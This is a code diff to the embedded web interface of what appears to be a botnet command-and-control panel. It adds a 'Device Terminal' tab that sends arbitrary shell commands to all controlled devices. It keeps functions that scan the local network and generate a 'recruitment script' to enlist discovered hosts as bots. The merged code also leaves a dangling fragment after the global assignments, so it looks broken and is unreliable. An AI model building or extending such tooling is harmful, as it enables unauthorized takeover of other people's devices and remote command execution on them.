@@ -2764,6 +2764,7 @@ UI_HTML = r"""<!DOCTYPE html>
                 <div class="panel-title">⚡ COMMAND CENTER</div>
                 <div class="command-tabs">
                     <div class="tab active" onclick="switchTab('terminal')">TERMINAL</div>
+                    <div class="tab" onclick="switchTab('device-terminal')">DEVICE TERMINAL</div>
                     <div class="tab" onclick="switchTab('bots')">BOT CONTROL</div>
                     <div class="tab" onclick="switchTab('files')">FILES</div>
                     <div class="tab" onclick="switchTab('services')">SERVICES</div>
@@ -2871,6 +2872,98 @@ UI_HTML = r"""<!DOCTYPE html>
                     <div class="terminal-line terminal-info">
                         <span class="terminal-timestamp">[INFO]</span> 
                         🤖 Use target selection for coordinated operations across bot groups
+                    </div>
+                </div>
+            </div>
+            
+            <div id="device-terminalTab" class="tab-content" style="display: none;">
+                <div class="device-terminal-header">
+                    <h3 style="color: #00ff9f; margin-bottom: 1rem;">🖥️ Direct Device Terminal Access</h3>
+                    <div style="background: rgba(0,255,159,0.1); padding: 0.5rem; border-radius: 4px; margin-bottom: 1rem; border-left: 3px solid #00ff9f;">
+                        <div style="font-size: 12px; color: #00ff9f;">
+                            💡 <strong>Device Terminal Mode:</strong> Direct access to your local device's terminal with real-time interaction
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="device-terminal-controls" style="margin-bottom: 1rem;">
+                    <div style="display: flex; gap: 1rem; align-items: center; margin-bottom: 0.5rem;">
+                        <button class="btn" onclick="initializeDeviceTerminal()">🚀 CONNECT TO DEVICE</button>
+                        <button class="btn btn-secondary" onclick="clearDeviceTerminal()">🧹 CLEAR</button>
+                        <button class="btn btn-secondary" onclick="exportDeviceTerminal()">📄 EXPORT LOG</button>
+                        <span style="color: #666; font-size: 11px;">
+                            Status: <span id="deviceTerminalStatus" style="color: #ff0080;">Disconnected</span>
+                        </span>
+                    </div>
+                    
+                    <div class="terminal-info" style="font-size: 11px; color: #666;">
+                        🔒 Secure local terminal access | 🎯 Direct command execution | ⚡ Real-time output
+                    </div>
+                </div>
+                
+                <div class="device-terminal-container" style="background: #000; border: 1px solid #00ff9f; border-radius: 4px; height: 400px; display: flex; flex-direction: column;">
+                    <div class="device-terminal-header-bar" style="background: linear-gradient(90deg, #00ff9f, #0080ff); padding: 0.3rem 1rem; color: #000; font-weight: bold; font-size: 12px;">
+                        🖥️ Device Terminal - Local System Access
+                    </div>
+                    
+                    <div id="deviceTerminalOutput" class="device-terminal-output" style="flex: 1; padding: 1rem; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.4;">
+                        <div style="color: #00ff9f;">
+                            Welcome to Device Terminal Access<br>
+                            ====================================<br><br>
+                            Click "CONNECT TO DEVICE" to establish direct terminal connection.<br>
+                            This provides real-time access to your local system terminal.<br><br>
+                            <span style="color: #0080ff;">Features:</span><br>
+                            • Real-time command execution<br>
+                            • Interactive terminal session<br>
+                            • Secure local access only<br>
+                            • Full shell capabilities<br><br>
+                            <span style="color: #ff0080;">Security Note:</span> This terminal has direct access to your local system.<br>
+                        </div>
+                    </div>
+                    
+                    <div class="device-terminal-input-area" style="border-top: 1px solid #333; padding: 0.5rem; display: flex; align-items: center;">
+                        <span style="color: #00ff9f; margin-right: 0.5rem; font-family: 'Courier New', monospace;">$</span>
+                        <input type="text" id="deviceTerminalInput" placeholder="Enter command..." 
+                               style="flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; outline: none;"
+                               onkeypress="handleDeviceTerminalKeyPress(event)"
+                               disabled>
+                        <button class="btn" style="margin-left: 0.5rem; padding: 0.3rem 0.8rem; font-size: 11px;" onclick="executeDeviceTerminalCommand()" disabled id="deviceTerminalExecuteBtn">
+                            EXECUTE
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="device-terminal-features" style="margin-top: 1rem;">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🎯 Quick Commands</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('pwd')">PWD</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ls -la')">LS</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('whoami')">WHOAMI</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('uname -a')">SYSTEM</button>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">📊 System Info</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('free -h')">MEMORY</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('df -h')">DISK</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('top -n 1 | head -20')">PROCESSES</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('netstat -tuln')">NETWORK</button>
+                            </div>
+                        </div>
+                        
+                        <div class="feature-panel">
+                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🔧 Terminal Tools</h5>
+                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('history | tail -10')">HISTORY</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('env | head -10')">ENV</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('which python3')">PYTHON</button>
+                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ps aux | grep python')">PYTHON PROCS</button>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -3852,7 +3945,260 @@ Or manually execute the deployment script.
         }
         
         // Enhanced Terminal Functions
-        // Ensure all important functions are globally accessible
+        function sendTerminalCommand() {
+            const target = document.getElementById('targetSelect').value;
+            const command = document.getElementById('commandInput').value.trim();
+            
+            if (!command) return;
+            
+            // Show command being executed
+            appendToTerminal(`📤 [${target}] ${command}`, 'command');
+            
+            // Use enhanced terminal API
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target, command, user_context: 'web_terminal' })
+            }).then(result => {
+                if (result.status === 'success') {
+                    const executionResult = result.execution_result;
+                    const deviceCount = executionResult.results?.length || 0;
+                    
+                    appendToTerminal(`✅ Command executed on ${deviceCount} devices`, 'success');
+                    
+                    // Display output from each device
+                    if (executionResult.results) {
+                        executionResult.results.forEach(deviceResult => {
+                            const deviceId = deviceResult.device_id || 'unknown';
+                            
+                            if (deviceResult.success) {
+                                if (deviceResult.output && deviceResult.output.trim()) {
+                                    appendToTerminal(`🖥️ Output from ${deviceId}:`, 'info');
+                                    // Display the actual command output
+                                    const outputLines = deviceResult.output.split('\n');
+                                    outputLines.forEach(line => {
+                                        if (line.trim()) {
+                                            appendToTerminal(`  ${line}`, 'output');
+                                        }
+                                    });
+                                } else {
+                                    appendToTerminal(`📝 ${deviceId}: Command completed (no output)`, 'info');
+                                }
+                                
+                                if (deviceResult.execution_time) {
+                                    appendToTerminal(`⏱️ ${deviceId}: Execution time: ${deviceResult.execution_time.toFixed(2)}s`, 'info');
+                                }
+                            } else {
+                                appendToTerminal(`❌ ${deviceId}: ${deviceResult.error || 'Command failed'}`, 'error');
+                            }
+                        });
+                    }
+                } else {
+                    appendToTerminal(`❌ Terminal execution failed: ${result.error}`, 'error');
+                }
+            }).catch(error => {
+                appendToTerminal(`❌ API Error: ${error.message}`, 'error');
+            });
+            
+            document.getElementById('commandInput').value = '';
+        }
+        
+        function sendQuickCommand(cmd) {
+            document.getElementById('commandInput').value = cmd;
+            sendTerminalCommand();
+        }
+        
+        function handleCommandKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendTerminalCommand();
+            }
+        }
+        
+        function clearTerminal() {
+            document.getElementById('terminal').innerHTML = `
+                <div class="terminal-line terminal-success">
+                    <span class="terminal-timestamp">[CLEARED]</span> 
+                    🧹 Terminal cleared - Ready for new commands
+                </div>
+            `;
+            appendToActivityLog('🧹 Terminal cleared by user');
+        }
+        
+        function exportTerminalLog() {
+            const terminal = document.getElementById('terminal');
+            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            appendToActivityLog('📄 Terminal log exported');
+        }
+        
+        // Auto-scroll functionality
+        let autoScrollEnabled = true;
+        function toggleTerminalAutoscroll(event) {
+            autoScrollEnabled = !autoScrollEnabled;
+            const button = event.target;
+            button.textContent = autoScrollEnabled ? 'AUTO-SCROLL' : 'MANUAL-SCROLL';
+            button.style.background = autoScrollEnabled ? '' : 'rgba(255, 0, 128, 0.3)';
+            
+            appendToTerminal(`${autoScrollEnabled ? '🔄' : '⏸️'} Auto-scroll ${autoScrollEnabled ? 'enabled' : 'disabled'}`, 'info');
+        }
+        
+        function getTerminalHistory() {
+            api('/api/terminal/history').then(result => {
+                appendToTerminal(`📜 Command History (${result.total_commands} total commands)`, 'info');
+                result.command_history.slice(-10).forEach(cmd => {
+                    const timestamp = new Date(cmd.timestamp * 1000).toLocaleTimeString();
+                    appendToTerminal(`  [${timestamp}] ${cmd.target} > ${cmd.command}`, 'info');
+                });
+            });
+        }
+        
+        // Enhanced appendToTerminal to respect auto-scroll
+        function appendToTerminal(message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const timestamp = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `terminal-line terminal-${type}`;
+            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(div);
+            
+            if (autoScrollEnabled) {
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+            
+            // Keep only last 100 entries for performance
+            while (terminal.children.length > 100) {
+                terminal.removeChild(terminal.firstChild);
+            }
+        }
+        
+        // Device Discovery Functions
+        function showDeviceDiscovery() {
+            const panel = document.getElementById('deviceDiscoveryPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        async function scanLocalNetwork() {
+            appendToTerminal('🔍 Starting network discovery scan...', 'info');
+            
+            try {
+                const result = await api('/api/discover/network', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal(`✅ Network scan completed - Found ${result.total_discovered} devices`, 'success');
+                    refreshDiscoveryResults();
+                } else {
+                    appendToTerminal(`❌ Network scan failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Network scan error: ${error.message}`, 'error');
+            }
+        }
+        
+        async function refreshDiscoveryResults() {
+            try {
+                const result = await api('/api/discover/results');
+                const container = document.getElementById('discoveryResults');
+                
+                if (result.discovered_devices && result.discovered_devices.length > 0) {
+                    container.innerHTML = '';
+                    result.discovered_devices.forEach(device => {
+                        const deviceDiv = document.createElement('div');
+                        deviceDiv.className = 'discovery-item';
+                        deviceDiv.innerHTML = `
+                            <div class="discovery-info">
+                                <strong>${device.ip}</strong>
+                                <div class="discovery-details">
+                                    OS: ${device.os || 'Unknown'} | 
+                                    Ports: ${device.open_ports?.join(', ') || 'None'} |
+                                    Status: ${device.status || 'Unknown'}
+                                </div>
+                            </div>
+                            <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
+                                RECRUIT
+                            </button>
+                        `;
+                        container.appendChild(deviceDiv);
+                    });
+                } else {
+                    container.innerHTML = '<div class="discovery-item">No devices discovered yet. Click "SCAN LOCAL NETWORK" to start.</div>';
+                }
+            } catch (error) {
+                console.error('Failed to refresh discovery results:', error);
+            }
+        }
+        
+        async function recruitDevice(ip, os) {
+            try {
+                const result = await api('/api/discover/recruit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_ip: ip, target_os: os })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
+                    appendToTerminal('📝 Deployment Script:', 'info');
+                    appendToTerminal(result.recruitment_script, 'code');
+                } else {
+                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Resource Optimization Functions
+        function showResourceOptimization() {
+            const panel = document.getElementById('resourceOptimizationPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        async function autoOptimizeResources() {
+            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
+            
+            try {
+                const result = await api('/api/optimization/apply', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ auto_optimize: true })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal('✅ Resource optimization completed', 'success');
+                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
+                    
+                    // Update optimization results panel
+                    const resultsDiv = document.getElementById('optimizationResults');
+                    resultsDiv.innerHTML = `
+                        <div style="color: #00ff9f;">✅ System Optimized</div>
+                        <div style="font-size: 12px; margin-top: 0.5rem;">
+                            Max Devices: ${result.new_limits.max_devices}<br>
+                            Workers: ${result.new_limits.max_workers}<br>
+                            Memory Limit: ${result.new_limits.max_memory_mb}MB
+                        </div>
+                    `;
+                } else {
+                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Assign all functions to window after they're defined for global access
         window.sendTerminalCommand = sendTerminalCommand;
         window.sendQuickCommand = sendQuickCommand;
         window.handleCommandKeyPress = handleCommandKeyPress;
@@ -3869,14 +4215,161 @@ Or manually execute the deployment script.
         window.openBotControlPanel = openBotControlPanel;
         window.closeBotControlPanel = closeBotControlPanel;
         
-        function sendTerminalCommand() {
-            const target = document.getElementById('targetSelect').value;
-            const command = document.getElementById('commandInput').value.trim();
+        // Device Terminal Functions
+        let deviceTerminalConnected = false;
+        let deviceTerminalSession = null;
+        
+        function initializeDeviceTerminal() {
+            deviceTerminalConnected = true;
+            document.getElementById('deviceTerminalStatus').textContent = 'Connected';
+            document.getElementById('deviceTerminalStatus').style.color = '#00ff9f';
+            document.getElementById('deviceTerminalInput').disabled = false;
+            document.getElementById('deviceTerminalExecuteBtn').disabled = false;
+            
+            appendToDeviceTerminal('🚀 Device terminal connection established', 'success');
+            appendToDeviceTerminal('Ready for command input. Type commands and press Enter.', 'info');
+            appendToDeviceTerminal('', 'info'); // Add spacing
+            
+            // Focus on input
+            document.getElementById('deviceTerminalInput').focus();
+        }
+        
+        function clearDeviceTerminal() {
+            document.getElementById('deviceTerminalOutput').innerHTML = `
+                <div style="color: #00ff9f;">
+                    Device Terminal - Session Cleared<br>
+                    ===================================<br><br>
+                    Terminal ready for new commands.<br><br>
+                </div>
+            `;
+        }
+        
+        function exportDeviceTerminal() {
+            const output = document.getElementById('deviceTerminalOutput');
+            const logs = output.textContent;
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `device-terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            appendToDeviceTerminal('📄 Terminal log exported', 'info');
+        }
+        
+        function handleDeviceTerminalKeyPress(event) {
+            if (event.key === 'Enter') {
+                executeDeviceTerminalCommand();
+            }
+        }
+        
+        function executeDeviceTerminalCommand() {
+            const input = document.getElementById('deviceTerminalInput');
+            const command = input.value.trim();
             
             if (!command) return;
             
-            // Show command being executed
-            appendToTerminal(`📤 [${target}] ${command}`, 'command');
+            sendDeviceTerminalCommand(command);
+            input.value = '';
+        }
+        
+        function sendDeviceTerminalCommand(command) {
+            if (!deviceTerminalConnected) {
+                appendToDeviceTerminal('❌ Terminal not connected. Click "CONNECT TO DEVICE" first.', 'error');
+                return;
+            }
+            
+            // Display command being executed
+            appendToDeviceTerminal(`$ ${command}`, 'command');
+            
+            // Execute via API with device terminal context
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    target: 'all', 
+                    command: command, 
+                    user_context: 'device_terminal',
+                    direct_mode: true 
+                })
+            }).then(result => {
+                if (result.status === 'success') {
+                    const executionResult = result.execution_result;
+                    
+                    if (executionResult.results && executionResult.results.length > 0) {
+                        const deviceResult = executionResult.results[0];
+                        
+                        if (deviceResult.success) {
+                            if (deviceResult.output && deviceResult.output.trim()) {
+                                // Display command output line by line
+                                const outputLines = deviceResult.output.split('\\n');
+                                outputLines.forEach(line => {
+                                    if (line.trim() || outputLines.length === 1) {
+                                        appendToDeviceTerminal(line, 'output');
+                                    }
+                                });
+                            } else {
+                                appendToDeviceTerminal('(no output)', 'info');
+                            }
+                            
+                            if (deviceResult.execution_time) {
+                                appendToDeviceTerminal(`⏱️ Completed in ${deviceResult.execution_time.toFixed(3)}s`, 'timing');
+                            }
+                        } else {
+                            appendToDeviceTerminal(`❌ Error: ${deviceResult.error || 'Command failed'}`, 'error');
+                        }
+                    } else {
+                        appendToDeviceTerminal('❌ No response from device', 'error');
+                    }
+                } else {
+                    appendToDeviceTerminal(`❌ Execution failed: ${result.error}`, 'error');
+                }
+                
+                appendToDeviceTerminal('', 'info'); // Add spacing after command
+            }).catch(error => {
+                appendToDeviceTerminal(`❌ API Error: ${error.message}`, 'error');
+                appendToDeviceTerminal('', 'info');
+            });
+        }
+        
+        function appendToDeviceTerminal(message, type = 'info') {
+            const output = document.getElementById('deviceTerminalOutput');
+            const div = document.createElement('div');
+            
+            // Color coding for different types
+            let color = '#fff';
+            switch(type) {
+                case 'success': color = '#00ff9f'; break;
+                case 'error': color = '#ff0080'; break;
+                case 'info': color = '#0080ff'; break;
+                case 'command': color = '#ffaa00'; break;
+                case 'output': color = '#ccc'; break;
+                case 'timing': color = '#888'; break;
+            }
+            
+            div.style.color = color;
+            div.style.marginBottom = '0.1rem';
+            div.textContent = message;
+            
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+            
+            // Keep only last 200 lines for performance
+            while (output.children.length > 200) {
+                output.removeChild(output.firstChild);
+            }
+        }
+        
+        // Add device terminal functions to global scope
+        window.initializeDeviceTerminal = initializeDeviceTerminal;
+        window.clearDeviceTerminal = clearDeviceTerminal;
+        window.exportDeviceTerminal = exportDeviceTerminal;
+        window.handleDeviceTerminalKeyPress = handleDeviceTerminalKeyPress;
+        window.executeDeviceTerminalCommand = executeDeviceTerminalCommand;
+        window.sendDeviceTerminalCommand = sendDeviceTerminalCommand;
             
             // Use enhanced terminal API
             api('/api/terminal/execute', {
@@ -3992,92 +4485,6 @@ Or manually execute the deployment script.
             });
         }
         
-        async function recruitDevice(ip, os) {
-            try {
-                const result = await api('/api/discover/recruit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ target_ip: ip, target_os: os })
-                });
-                
-                if (result.status === 'success') {
-                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
-                    appendToTerminal('📝 Deployment Script:', 'info');
-                    appendToTerminal(result.recruitment_script, 'code');
-                } else {
-                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
-            }
-        }
-        
-        // Resource Optimization Functions
-        function showResourceOptimization() {
-            const panel = document.getElementById('resourceOptimizationPanel');
-            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        }
-        
-        async function autoOptimizeResources() {
-            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
-            
-            try {
-                const result = await api('/api/optimization/apply', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ auto_optimize: true })
-                });
-                
-                if (result.status === 'success') {
-                    appendToTerminal('✅ Resource optimization completed', 'success');
-                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
-                    
-                    // Update optimization results panel
-                    const resultsDiv = document.getElementById('optimizationResults');
-                    resultsDiv.innerHTML = `
-                        <div style="color: #00ff9f;">✅ System Optimized</div>
-                        <div style="font-size: 12px; margin-top: 0.5rem;">
-                            Max Devices: ${result.new_limits.max_devices}<br>
-                            Max Workers: ${result.new_limits.max_workers}<br>
-                            Max Memory: ${result.new_limits.max_memory_mb}MB
-                        </div>
-                    `;
-                } else {
-                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
-            }
-        }
-        
-        async function getOptimizationProfile() {
-            try {
-                const result = await api('/api/optimization/profile');
-                
-                if (result.status === 'success') {
-                    const profile = result.optimization_profile;
-                    appendToTerminal('📊 System Optimization Profile:', 'info');
-                    appendToTerminal(`💾 RAM: ${profile.ram?.total_gb?.toFixed(1)}GB total, ${profile.ram?.available_gb?.toFixed(1)}GB available`, 'info');
-                    appendToTerminal(`🔧 CPU: ${profile.cpu?.cores} cores, ${profile.cpu?.current_usage}% usage`, 'info');
-                    appendToTerminal(`💿 Disk: ${profile.disk?.free_gb?.toFixed(1)}GB free`, 'info');
-                    
-                    if (profile.battery?.present) {
-                        appendToTerminal(`🔋 Battery: ${profile.battery.percent}% ${profile.battery.power_plugged ? '(charging)' : '(on battery)'}`, 'info');
-                    }
-                    
-                    if (profile.recommendations?.length > 0) {
-                        appendToTerminal('💡 Recommendations:', 'info');
-                        profile.recommendations.forEach(rec => {
-                            appendToTerminal(`  • ${rec}`, 'warning');
-                        });
-                    }
-                } else {
-                    appendToTerminal(`❌ Profile retrieval failed: ${result.error}`, 'error');
-                }
-            } catch (error) {
-                appendToTerminal(`❌ Profile error: ${error.message}`, 'error');
-            }
-        }
         
         // Update sendCommand to use enhanced terminal
         function sendCommand() {
